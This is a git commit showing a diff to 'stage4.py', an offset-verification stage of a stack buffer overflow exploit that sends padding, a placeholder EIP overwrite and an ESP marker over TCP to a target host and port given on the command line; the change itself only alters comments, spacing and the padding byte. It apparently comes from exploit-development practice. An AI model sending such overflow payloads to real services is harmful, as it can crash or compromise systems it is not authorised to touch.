e446965af0065fe1544f96314d219a718a36d5f4
n7ruzn <yeli.buonya@protonmail.com>
2021-07-07 23:53:29 -0400

    fixed description

--- stage4.py
+++ stage4.py
@@ -2,16 +2,17 @@
 # stage 4 verify the offset
 import socket,sys
 
+
 RHOST = sys.argv[1]
 RPORT = int(sys.argv[2])
 
 
-# setup payload 
+# Handle Payload 
 offset = 146
 total_buff_size = 650
 
 buff          = b""
-lead_padding = b"\x41" * (offset - len(buff))                 # lead padding
+lead_padding  = b"\x4E" * (offset - len(buff))                 # lead padding
 eip           = b"\x42" * 4                                    # saved return pointer overwrite (EIP/SRP) 
 esp           = b"\x43" * 4                                    # where esp should be pointing
 postfix       = b"\n"              
@@ -28,6 +29,8 @@ buff += postfix
 
 # handle connection 
 print("[+] - Sendng Payload - [ {} Bytes ]".format(len(buff)))
+
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST, RPORT))
 s.send(buff)
